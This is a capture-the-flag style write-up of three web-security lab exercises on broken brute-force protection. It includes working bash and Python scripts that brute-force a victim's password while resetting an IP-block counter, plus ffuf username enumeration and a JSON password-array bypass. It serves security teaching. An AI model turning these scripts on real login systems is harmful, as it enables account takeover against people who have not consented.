# Vulnerabilities in password-based login

## Lab: Broken brute-force protection, IP block

This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

- Your credentials: `wiener:peter`
- Victim's username: carlos
- Candidate passwords
  
Hint: Advanced users may want to solve this lab by using a macro or the Turbo Intruder extension. However, it is possible to solve the lab without using these advanced features.

We made a test request:
![image](https://github.com/user-attachments/assets/1ed07196-7f9b-4aa3-8ce7-69f8e11af98c)

The server blocks us after three invalid login attempts:  
![image](https://github.com/user-attachments/assets/3c6cb504-9e7a-4381-b2de-80e7d1af445f)
**Note:** We know that the server is blocking our IP instead of the user because when we try with our user, we are still blocked:  
![image](https://github.com/user-attachments/assets/8cb0294a-c78d-4632-8b23-ae7fa5870943)

We realize manually that we can reset the counter to 0 by logging in with our credentials before the server blocks us:
![image](https://github.com/user-attachments/assets/d1562628-de39-49bf-a63b-3df16764f112)

We created the following script that performs a password brute force attack, resetting the server's counter to zero whenever 2 failed login attempts are reached:
```bash
#!/bin/bash

url="https://0a40005e033f387d8000fdfe00aa000e.web-security-academy.net/login"
passwords=("123456" "password" "12345678" "qwerty" "123456789" "12345" "1234" "111111" "1234567" "dragon"
           "123123" "baseball" "abc123" "football" "monkey" "letmein" "shadow" "master" "666666" "qwertyuiop"
           "123321" "mustang" "1234567890" "michael" "654321" "superman" "1qaz2wsx" "7777777" "121212" "000000"
           "qazwsx" "123qwe" "killer" "trustno1" "jordan" "jennifer" "zxcvbnm" "asdfgh" "hunter" "buster"
           "soccer" "harley" "batman" "andrew" "tigger" "sunshine" "iloveyou" "2000" "charlie" "robert"
           "thomas" "hockey" "ranger" "daniel" "starwars" "klaster" "112233" "george" "computer" "michelle"
           "jessica" "pepper" "1111" "zxcvbn" "555555" "11111111" "131313" "freedom" "777777" "pass"
           "maggie" "159753" "aaaaaa" "ginger" "princess" "joshua" "cheese" "amanda" "summer" "love"
           "ashley" "nicole" "chelsea" "biteme" "matthew" "access" "yankees" "987654321" "dallas" "austin"
           "thunder" "taylor" "matrix" "mobilemail" "mom" "monitor" "monitoring" "montana" "moon" "moscow")
   
reset_username="wiener"
reset_password="peter"

fail_count=0

for ((i=0; i<${#passwords[@]}; i++)); do
  password="${passwords[i]}" 

 
  full_response=$(curl -s -X POST "$url" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=carlos&password=$password")

 
  if [[ ! "$full_response" =~ "Incorrect password" ]]; then
    echo "Successful login for password: $password"
  fi


  if [[ "$full_response" =~ "Incorrect password" ]]; then
    fail_count=$((fail_count + 1))
  else
    fail_count=0  
  fi

 
  if [[ $fail_count -ge 2 ]]; then
    curl -s -X POST "$url" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "username=$reset_username&password=$reset_password" > /dev/null
  fi
done
```
We executed the script and obtained the password:
![image](https://github.com/user-attachments/assets/298304e6-0291-42b9-949b-3c8a14c7d835)

We could also to create the following python scrypt:
```python
#!/usr/bin/env python3
import requests


url = "https://0a3a003203e8cf79812b751500770071.web-security-academy.net/login"
own_username = "wiener"
own_password = "peter"
fail_count = 0

with open('passwords.txt', 'r') as f:
    passwords =  [line.strip() for line in f.readlines()]

for password in passwords:
    data = {
            'username': "carlos",
            'password': password
            }
    r = requests.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
    full_response = r.text

    if "Incorrect password" not in full_response:
        print(f"Successful login for password: {password}")
        break
    else:
        fail_count += 1
        
    if fail_count == 2:
        data = {
                'username': own_username,
                'password': own_password
                }
        r = requests.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        fail_count = 0
```

We could also have used a Burp Suite Intruder Pitchfork Attack by generating the lists (correct credentials every 2 incorrect ones). We will regenerate the lab and proceed to solve it this way.
```python
#!/usr/bin/env python3

print("------ Lista users -----")
for i in range(150):
    if i % 3 == 0 or i % 3 == 1:
        print("carlos")
    else:
        print("wiener")


print("------------------------------------------")
print("----- Lista passwords -----")

with open('passwords.txt', 'r') as f:
    lines =  f.readlines()

i = 0 

for passwd in lines:
    if i % 3 == 0 or i% 3 == 1:
        print(passwd.strip())
    else:
        print('peter')
    i += 1

```

We performed the Pitchfork Attack with Burp Suite Intruder, configuring both payloads with the generated lists:
![image](https://github.com/user-attachments/assets/20630434-b69d-4fdf-92c1-3dd86d40a363)

We log in and complete the lab:
![image](https://github.com/user-attachments/assets/74d0ab86-86dd-4238-a1ca-7b63b2569b87)

---

## Lab: Username enumeration via account lock

This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

Wordlists:
- Candidate usernames
- Candidate passwords

We first perform a `cURL` inspection with test credentials:
![image](https://github.com/user-attachments/assets/718b2233-0db5-455d-8d43-c71a0a93876c)

Next, we perform fuzzing with `ffuf` to enumerate valid usernames. We run `ffuf` 3 or 4 times until we get a different response:
![image](https://github.com/user-attachments/assets/1e5b8d71-5fd9-49a4-bfe7-42bc104cbb83)
This happens because the server blocks the account after the third failed login attempt, allowing enumeration of the blocked user:
![image](https://github.com/user-attachments/assets/ecc6a897-a05d-4e18-9938-6471787bd25d)

We then perform a password brute-force attack using this user:
![image](https://github.com/user-attachments/assets/bd3496b1-4949-4f46-8219-1738c3abc796)

We create a small password file with these passwords and attempt the attack again after waiting for one minute:
![image](https://github.com/user-attachments/assets/c14920ba-76e1-4ee6-a3d4-b7c7a1c57cae)


Finally, we log in and complete the lab:
![image](https://github.com/user-attachments/assets/8da90fcb-de49-4413-b4a1-604898b3e1e0)

**Note:**  
We could also use Burp Suite Intruder:  
![image](https://github.com/user-attachments/assets/177fe106-2767-4247-bd42-d1dd381a5079)

---

## Lab: Broken brute-force protection, multiple credentials per request

This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.

- Victim's username: carlos
- Wordlist: Candidate passwords

We begin the lab by sending a test `POST` request to understand the server's internal mechanism:
![image](https://github.com/user-attachments/assets/e9f36794-70f9-433c-be2c-c5778decf756)

We observe that the server receives `JSON` data in the request. Additionally, we know that the server implements brute-force protection and will block us if we send too many requests in a short period of time. To test the server's handling of `JSON` arrays, we attempt to send an array of passwords in the `JSON` password parameter:
![image](https://github.com/user-attachments/assets/36bd5b38-4fb9-4453-969b-acda1d60a611)

Since the server allows us to send arrays, we can send a wordlist of passwords in the same way. We create a Python script to convert a simple passwords list into a `JSON` format:

```python
import json

with open('passwords.txt', 'r') as f:
    passwords =  [line.strip() for line in f.readlines()]

passwords_json = json.dumps({"passwords": passwords}, indent=4)

with open("passwords.json", "w") as file:
    file.write(passwords_json)
```

We send the request using the array of passwords, which allows us to test multiple passwords in a single request while avoiding server blocks:
![image](https://github.com/user-attachments/assets/d1e2e012-5900-4c81-84d5-a5cfac1ed4b2)

Right-click on the response and click on `Show response in browser`, then copy and paste the link into your browser.

We have completed de lab:
![image](https://github.com/user-attachments/assets/25c91788-b0cf-4d64-a243-748ad41c87c5)

Note that you can also copy the session cookie, paste it into your browser, then click on `My account` to complete the lab.
